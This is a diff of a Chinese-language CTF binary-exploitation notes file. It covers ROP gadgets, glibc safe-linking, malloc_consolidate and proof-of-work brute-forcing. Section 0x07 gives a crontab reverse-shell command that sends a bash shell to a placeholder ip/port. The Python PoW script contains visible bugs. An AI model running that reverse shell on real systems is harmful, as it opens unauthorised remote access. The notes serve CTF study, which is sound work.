@@ -11,17 +11,17 @@ typora-copy-images-to: ../assets/img/2022
 
 
 
-# 0x01 ROPgadget命令
+## 0x01 ROPgadget命令
 
 `ROPgadget --binary ./elf --string "/bin/sh"`
 
 `ROPgadget --binary ./elf --only "pop|ret" | grep rdi`
 
-# 0x02 gcc编译指定libc版本
+## 0x02 gcc编译指定libc版本
 
 `gcc example.c -o example2.23 -Wl,-rpath='./libc-2.23/' -Wl,-dynamic-linker='./libc-2.23/ld-2.23.so'`
 
-# 0x03 gcc安全编译选项
+## 0x03 gcc安全编译选项
 
 ```
 CANNARY
@@ -65,7 +65,7 @@ gcc -z lazy -o test test.c              // 部分开启，即Partial RELRO
 gcc -z now -o test test.c               // 全部开启，即
 ```
 
-# 0x04 system("$0") == system("/bin/sh")
+## 0x04 system("$0") == system("/bin/sh")
 
 system("$0") == system("/bin/sh")
 
@@ -79,7 +79,7 @@ https://youtu.be/_ZnnGZygnzE?t=4522
 
 
 
-# 0x05 pwndbg中查看状态寄存器
+## 0x05 pwndbg中查看状态寄存器
 
 ```bash
 i r eflags 查看状态寄存器
@@ -87,7 +87,7 @@ i r eflags 查看状态寄存器
 
 
 
-# 0x06 一些汇编指令
+## 0x06 一些汇编指令
 
 1、test与jne、je搭配时，test判断两个操作数是否相同
 
@@ -105,7 +105,7 @@ AX = AH + AL
 
 
 
-# 0x07 crontab反弹shell
+## 0x07 crontab反弹shell
 
 `* * * * * bash -c "bash -i >& /dev/tcp/ip/port 1>&0"`
 
@@ -119,15 +119,15 @@ crontab常用命令
 
 
 
-# 0x08 tcache和largebin大小
+## 0x08 tcache和largebin大小
 
 64位下 tcache最大放0x410的chunk，largebin从0x400开始
 
 
 
-# 0x09 safe-linking加解密与bypass
+## 0x09 safe-linking加解密与bypass
 
-##加密
+###加密
 
 ![image-20220930000628640](/assets/img/2022/image-20220930000628640.png)
 
@@ -147,7 +147,7 @@ crontab常用命令
 
 
 
-##解密
+###解密
 
 众所周知，异或操作是可逆的
 
@@ -161,7 +161,7 @@ crontab常用命令
 
 
 
-##解密的关键
+###解密的关键
 
 所以说leak出 `L>>12` 是关键
 
@@ -182,13 +182,13 @@ crontab常用命令
 
 
 
-## 利用
+### 利用
 
 把伪造的fd 和 KEY 异或一下，填入就可以
 
 
 
-## bypass
+### bypass
 
 待补充
 
@@ -208,7 +208,7 @@ https://www.anquanke.com/post/id/207770
 
 
 
-# 0x10 glibc 2.32引入的变化
+## 0x10 glibc 2.32引入的变化
 
 - 引入了safe-linking
 
@@ -228,3 +228,72 @@ http://blog.nsfocus.net/glibc-234/
 **Ref.**
 
 https://medium.com/@b3rm1nG/%E8%81%8A%E8%81%8Aglibc-2-32-malloc%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6-safe-linking-9fb763466773
+
+
+
+## 0x11 malloc_consolidate调用点
+
+`malloc_consolidate`负责将fastbin中的chunk合并放入unsorted bin中，防止内存过于碎片化。
+
+glibc为了加速内存分配，引入了fastbin这一缓冲区，fastbin中的chunk的inuse位不会被清空，使得chunk在释放时不会被合并。
+
+fastbin中的chunk的整理就由`malloc_consolidate`负责。
+
+malloc.c中`malloc_consolidate`有以下几个调用点
+
+- malloc中
+
+1、smallbin初始化会通过`malloc_consolidate`进行
+
+2、申请largebin size的chunk时会先进行
+
+3、当fastbin和bins中没找到匹配的chunk，并且Top也不够大无法分配chunk时。这时会调用`malloc_consolidate`
+
+- free中
+
+1、释放的chunk size大于`FASTBIN_CONSOLIDATION_THRESHOLD`。`FASTBIN_CONSOLIDATION_THRESHOLD`默认等于65536（0x10000）
+
+- malloc_trim/mallopt/mallinfo
+
+1、使用`malloc_consolidate`初始化`av`
+
+
+
+## 0x12 各种pow整理
+
+
+
+爆破sha256
+
+```python
+from pwn import *
+import hashlib
+
+def is_ok(x, prefix):
+    return bin(int(hashlib.sha256(prefix+x.encode()).hexdigest().encode('hex'), 16))[2:].rjust(256, '0').startwith("0"*26)
+prefix = raw_input("pow:").strip()
+print(repr(prefix))
+s = util.iters.mbruteforce(lambda x:is_ok(x, prefix), string.ascii_letters+string.digits, 5, 'fixed')
+print(s)
+```
+
+
+
+
+
+## 0x13 pwn题中的alarm patch
+
+用vim打开elf，搜索`alarm`，然后改成`isnan`，保存
+
+
+
+
+
+## 0x14 pwn题中栈地址泄露的方法
+
+- 通过libc的environ symbol，libc的environ记录了栈真实地址，满足以下两个条件就可以leak出栈地址
+  - libc基地址已经泄露
+  - 具有任意地址读的能力，需要读libc environ处的值
+
+
+
